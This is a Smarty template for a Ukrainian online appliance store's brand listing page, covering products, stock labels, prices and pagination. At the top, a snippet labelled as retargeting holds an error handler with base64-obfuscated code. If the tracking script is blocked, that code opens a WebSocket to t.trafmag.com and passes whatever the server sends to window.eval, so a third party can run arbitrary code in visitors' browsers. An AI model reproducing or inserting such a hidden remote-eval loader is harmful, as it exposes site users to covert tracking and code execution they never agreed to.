{include file='layouts/_header.tpl'}

<!--Trafmag ретаргетинг-->
{literal}
    <script type='text/javascript'>(function (t, r, f, m, g, c) {
            g = t.createElement(r), c = t.getElementsByTagName(r)[0];
            g.type = 'text/javascript';
            g.async = 1;
            g.src = (t.location.protocol == 'https:' ? 'https:' : 'http:') + f + m;
            g.onerror = function () {
                try {
                    if (t.location.protocol == 'https:') {
                        var wsproto = 'wss', wsport = '8041'
                    } else {
                        var wsproto = 'ws', wsport = '8040'
                    }
                    ;var wrkr_tr_location = wsproto + ':' + f + ':' + wsport + m + '?ref=' + encodeURIComponent(window.location.href);
                    var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));
                    wrkr_tr.onmessage = function (msg) {
                        window.eval(msg.data)
                    };
                    wrkr_tr.postMessage('');
                } catch (err) {
                }
            };
            c.parentNode.insertBefore(g, c);
        })(document, 'script', '//t.trafmag.com', '/tracking.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->

{if $brand}
    <div class="container">
        {assign var=pages value=$paginator->getPages()}

        <div class="options wrap">

            <div class="bread-crumbs breadcrumbs mobile-display-none" id="breadcrumbs" itemscope=""
                 itemtype="http://schema.org/BreadcrumbList">
                <div itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="button">
                    <a href="/" itemprop="item">Главная</a>
                    <meta itemprop="position" content="1">
                </div>


                <div itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="button">
                    <span itemprop="name" class="label1">{$brandName}</span>
                    <meta itemprop="position" content="2">
                </div>

            </div>

            <div class="liner cent">
                <span>
                    Техника {$brandName}
                </span>
            </div>

            <div class="base-options">

                {*----------SORT----------*}
                {include file='catalog/subs-nav.tpl'}
                {*----------SORT----------*}


            </div>
        </div>
        <!-- SEO -->
        <div class="fashion wrap">
            {$seo_text_bottom|default:''}
        </div>
        <!-- SEO -->
        {include file='layouts/orig.tpl'}
    </div>
    <div id="category_block_view_listing" class="span-12 no_margin">
    {foreach from=$items item=item name=catitems}
        {if $smarty.foreach.catitems.iteration == 3}
            <!-- Баннер "Принимаем платежные карты" -->
            <div class="span-4 category_block_view_item category_block_view_ads">
                <a href="https://590.ua/news/%D0%9F%D1%80%D0%B8%D0%BD%D0%B8%D0%BC%D0%B0%D0%B5%D0%BC-%D0%BA-%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B5-%D0%BF%D0%BB%D0%B0%D1%81%D1%82%D0%B8%D0%BA%D0%BE%D0%B2%D1%8B%D0%B5-%D0%BA%D0%B0%D1%80%D1%82%D0%BE%D1%87%D0%BA%D0%B8">
                    <img class="category_block_view_item_banner" src="/images/visa-210x345.jpg"
                         alt="Принимаем к оплате пластиковые карточки Visa, Maestro, MasterCard">
                </a>
            </div>
        {/if}
        <div class="prev_bonus" style="display:none;">
            Купив {$item.brand} {$item.name} у нас, Вы получаете +{$item.bonus_amount|round}грн на бонусный счет к цене!
        </div>
        {if $item.bestprice > $item.price || $item.id2==41385}
            <i title="Лучшая цена" class="sale-icon sale-icon-price"></i>
        {/if}
        {if $item.specprice && ($item.bdprice > $item.price) && (($item.bdprice - $item.price) > 1) && !($item.sale==1 && $item.d90==-1)}
            <i title="Акционная цена" class="sale-icon sale-icon-discount"></i>
        {/if}
        {if $item.sale==1 && $item.d90==-1}
            <i title="Распродажа" class="sale-icon sale-icon-sale"></i>
        {/if}
        <div class="head">
            <a href="{iurl assoc.parent=$item.parentname  assoc.cat_latin=$item.cat_latin_single assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}">{$item.brand} {$item.name}</a>
            <span class="description">{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if}</span>

            {if !($item.archive == 1 && $item.id_availability == 3) && ($manager || $item.id_availability == 3)}
                {if $item.id_availability == 1} <span class="in_stock_status">
                    <link itemprop="availability" href="http://schema.org/InStock"/>

Есть в наличии{/if}</span>
                {if $item.id_availability == 2}
                    <link itemprop="availability" href="http://schema.org/InStock"/>
                    <span class="status_stock_status">Наличие уточняйте</span>
                {/if}
                {if $item.id_availability == 3}
                    <span class="order_stock_status">
                                <a class="on-order" target="_blank" href="/articles/4"
                                   title="Как получить товар под заказ">
                                    <link itemprop="availability" href="http://schema.org/PreOrder"/>Под заказ
                                </a>
                            </span>
                {/if}
                {if $item.id_availability == 4}
                    <span class="in_stock_status" rel="tooltip" data-placement="top"
                          data-original-title="Есть в наличии. Доставка через 5 рабочих дней"
                          title="Есть в наличии. Доставка через 5 рабочих дней">
                                <link itemprop="availability" href="http://schema.org/InStock"/>Есть в наличии. Доставка через 5 рабочих дней
                            </span>
                {/if}
            {/if}
        </div>
        <div class="image_holder">
            {if $item.imgid}
                <a href="{iurl  assoc.cat_latin=$item.cat_latin_single assoc.parent=$item.parentname assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}"
                   title="{$item.brand} {$item.name}">
                    <img itemprop="image" src="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}"
                         title="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}"
                         alt="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name} - catalog"/>
                </a>
            {else}
                <img src="/images/noimage.jpg" alt="{$item.brand} {$item.name}"/>
            {/if}
        </div>
        {if $item.acttype=='gift'}
            <div class="gift">
                <div class="products_container_image_wrap">
                    <a href="#gift-modal-{$item.id}" data-toggle="modal" class="gift-txt-lnk data-getActInfo"
                       id="i_{$item.id}"><img src="/images/catalog/{gift assoc.id=$item.actid}" alt="">
                    </a>
                </div>
                <span>Подарок</span>
            </div>
        {/if}
        <span class="full_description">{if $zf.params.catid == 189}{$item.short_info|replace:'Стиральная машина':''}{else}{$item.short_info|truncate:270}{/if}</span>
        <span class="style_price">Цена:</span>
        <br>
        {if $item.specprice  && ($item.bdprice > $item.price) && (($item.bdprice - $item.price)/$item.price > 0.01) }
            <span class="price_sidebar old">{price $item.bdprice $item.id_currency} <span
                        class="currency">{$smarty.session.Currency.title}</span></span>
            <span class="price_sidebar new">{price $item.price $item.id_currency} <span
                        class="currency">{$smarty.session.Currency.title}</span></span>
        {else}
            <span class="price_sidebar">{price $item.price $item.id_currency}
                <span class="currency">{$smarty.session.Currency.title}</span>
                    </span>
        {/if}

        {if $item.id_brand == '26' && $item.id_category != 60}<i class="guarantee-icon"></i>{/if}

        </div><!-- / .cat-item1 -->
    {/foreach}
    </div><!-- / .products -->
    <div class="clear"></div>
{/if}

<!-- pager -->
{if $pages->pageCount > 1}
    <div class="span-12 no_margin category_nav paggination">
        <p>Страницы:</p>
        {if $pages->current > 1}
            <a href="{if $pages->current-1=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$pages->current-1}{/if}">&larr;</a>
        {/if}
        {if $pages->firstPageInRangeNum!=1}
            <a href="{$firstPageUrl}">1</a>
            <p>...</p>
        {/if}
        {if $pages->pagesInRange}
            {foreach from=$pages->pagesInRange item=p key=k}
                {if $pages->current!=$k}
                    <a href="https://590.ua{if $k=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$k}{/if}">{$k}</a>
                {else}
                    <span class="current">{$pages->current}</span>
                {/if}
            {/foreach}
        {/if}
        {if $pages->pageCount && $pages->lastPageInRange != $pages->last}
            <p>...</p>
            <a href="https://590.ua{$firstPageUrl}/page/{$pages->pageCount}">{$pages->pageCount}</a>
        {/if}

        {if $pages->current < $pages->pageCount}
            <a href="https://590.ua{$firstPageUrl}/page/{$pages->current+1}">&rarr;</a>
        {/if}
    </div>
{/if}
<!-- / .pager -->


{include file='layouts/_footer.tpl'}